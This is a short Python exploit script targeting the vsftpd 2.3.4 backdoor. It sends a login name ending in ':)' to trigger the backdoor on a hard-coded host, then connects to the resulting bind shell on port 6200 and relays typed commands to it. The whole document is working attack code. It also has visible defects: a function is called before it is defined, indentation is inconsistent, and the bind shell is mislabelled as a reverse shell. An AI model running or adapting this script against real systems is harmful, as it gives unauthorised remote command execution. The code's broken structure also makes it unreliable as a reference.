"""
Simple script to try and trigger the vsftpd 2.3.4 exploit by
sending input to the USER input field with a smiley face
appended at the end. This results in a bind shell opening on port 6200.

After successfully triggering the backdoor, the script will establish a shell
connection to the victim host on port 6200.
"""

import socket
import sys
import time


server = '192.168.108.130'

def Trigger():
    try:
        print("[x] Trying to trigger the vsftpd 2.3.4 backdoor")
        ftp_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_connect.connect((server, 21))
        banner_grab = ftp_connect.recv(1024)
        print("[x] Victim host should be vulnerable...")
        ftp_connect.send(b'USER triggerme:)\n')
        ftp_connect.send(b'PASS howaboutnow\n')
        time.sleep(3)
        ftp_connect.close()
        print("[x] Backdoor successfully triggered")
	Exploit()
    except Exception:
        print("[!] Failed to trigger backdoor")
        sys.exit()
Trigger()

def Exploit():
    ftp_exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("[x] Trying to establish a reverse shell...")
        ftp_exploit.connect((server, 6200))
        print("[+] Reverse shell connected")	
	while "i" in "i":
		command = str.encode(input(">>> " + '\n'))
        	ftp_exploit.send(command)
        	response = ftp_exploit.recv(1024).decode('utf-8')
		print(response)
    except Exception:
        print("[!] Failure to establish a shell...")
